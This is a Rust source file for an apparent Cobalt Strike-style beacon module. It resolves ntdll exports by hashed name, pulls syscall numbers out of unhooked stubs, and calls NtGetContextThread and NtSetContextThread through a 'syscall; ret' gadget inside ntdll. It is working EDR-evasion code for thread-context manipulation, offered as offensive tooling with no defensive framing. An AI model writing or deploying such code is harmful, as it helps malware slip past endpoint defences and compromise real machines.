use core::arch::naked_asm;
use opsec_peb::{ModuleHandle, resolve_module, resolve_export};
use opsec_strcrypt::hash;

unsafe extern "C" { fn BeaconOutput(kind: i32, data: *const u8, len: i32); }
macro_rules! bdbg {
    ($msg:literal) => {{
        let b: &[u8] = $msg;
        unsafe { BeaconOutput(0x0D, b.as_ptr(), b.len() as i32); }
    }}
}

/// Extract SSN from clean NT stub: `4C 8B D1  B8 ?? ?? ?? ??  ...`
/// Returns Some(ssn) if unhooked, None if the prologue looks patched.
pub unsafe fn extract_ssn(stub: *const u8) -> Option<u32> {
    unsafe {
        if *stub == 0x4c && *stub.add(1) == 0x8b && *stub.add(2) == 0xd1
            && *stub.add(3) == 0xb8
        {
            let ssn = core::ptr::read_unaligned(stub.add(4) as *const u32);
            Some(ssn)
        } else {
            None
        }
    }
}

/// Indirect syscall via a `syscall; ret` gadget inside ntdll (never from our .text).
/// 4 args in rcx/rdx/r8/r9; SSN in eax; gadget address in r11.
///
/// # Safety
/// `gadget` must point to valid `syscall; ret` inside ntdll; ssn must be correct.
#[naked]
pub unsafe extern "system" fn indirect_syscall4(
    _arg1: usize, _arg2: usize, _arg3: usize, _arg4: usize,
    _ssn: u32, _gadget: usize,
) -> i32 {
    unsafe {
        naked_asm!(
            "mov r10, rcx",
            "mov eax, [rsp + 0x28]",
            "mov r11, [rsp + 0x30]",
            "jmp r11",
        );
    }
}

#[derive(Debug)]
pub enum Error {
    NtdllNotFound,
    StubNotFound(&'static str),
    GadgetNotFound,
}

pub struct Bootstrap {
    pub ntdll: ModuleHandle,
    pub gadget: usize,
    pub get_ctx: *const u8,
    pub get_ctx_ssn: u32,
    pub set_ctx: *const u8,
    pub set_ctx_ssn: u32,
}

impl Bootstrap {
    pub unsafe fn init() -> Result<Self, Error> {
        bdbg!(b"[bs] resolve ntdll\n");
        let ntdll = unsafe {
            resolve_module(hash!("ntdll.dll")).ok_or(Error::NtdllNotFound)?
        };
        bdbg!(b"[bs] ntdll ok\n");

        bdbg!(b"[bs] resolve get_ctx\n");
        let get_ctx = unsafe {
            resolve_export(ntdll, hash!("NtGetContextThread"))
                .ok_or(Error::StubNotFound("NtGetContextThread"))? as *const u8
        };
        bdbg!(b"[bs] get_ctx ok\n");

        bdbg!(b"[bs] resolve set_ctx\n");
        let set_ctx = unsafe {
            resolve_export(ntdll, hash!("NtSetContextThread"))
                .ok_or(Error::StubNotFound("NtSetContextThread"))? as *const u8
        };
        bdbg!(b"[bs] set_ctx ok\n");

        let get_ctx_ssn = unsafe { extract_ssn(get_ctx).unwrap_or(0) };
        let set_ctx_ssn = unsafe { extract_ssn(set_ctx).unwrap_or(0) };
        bdbg!(b"[bs] ssns extracted\n");

        bdbg!(b"[bs] pe_size_of_image\n");
        let size = unsafe { pe_size_of_image(ntdll) };
        bdbg!(b"[bs] find_syscall_ret\n");
        let gadget = unsafe {
            crate::gadget::find_syscall_ret(ntdll.as_usize(), size)
                .ok_or(Error::GadgetNotFound)?
        };
        bdbg!(b"[bs] gadget found\n");

        Ok(Bootstrap { ntdll, gadget, get_ctx, get_ctx_ssn, set_ctx, set_ctx_ssn })
    }

    pub unsafe fn nt_get_context_thread(
        &self,
        thread: *mut core::ffi::c_void,
        context: *mut core::ffi::c_void,
    ) -> i32 {
        unsafe {
            if extract_ssn(self.get_ctx).is_some() {
                type Fn = unsafe extern "system" fn(*mut core::ffi::c_void, *mut core::ffi::c_void) -> i32;
                let f: Fn = core::mem::transmute(self.get_ctx);
                f(thread, context)
            } else {
                indirect_syscall4(
                    thread as usize, context as usize, 0, 0,
                    self.get_ctx_ssn, self.gadget,
                )
            }
        }
    }

    pub unsafe fn nt_set_context_thread(
        &self,
        thread: *mut core::ffi::c_void,
        context: *const core::ffi::c_void,
    ) -> i32 {
        unsafe {
            if extract_ssn(self.set_ctx).is_some() {
                type Fn = unsafe extern "system" fn(*mut core::ffi::c_void, *const core::ffi::c_void) -> i32;
                let f: Fn = core::mem::transmute(self.set_ctx);
                f(thread, context)
            } else {
                indirect_syscall4(
                    thread as usize, context as usize, 0, 0,
                    self.set_ctx_ssn, self.gadget,
                )
            }
        }
    }
}

unsafe fn pe_size_of_image(m: ModuleHandle) -> usize {
    unsafe {
        let base = m.as_usize();
        let e_lfanew = core::ptr::read_unaligned((base + 0x3C) as *const u32) as usize;
        // PE32+ optional header: SizeOfImage is at offset 56 within optional header
        let opt = base + e_lfanew + 24;
        core::ptr::read_unaligned((opt + 56) as *const u32) as usize
    }
}
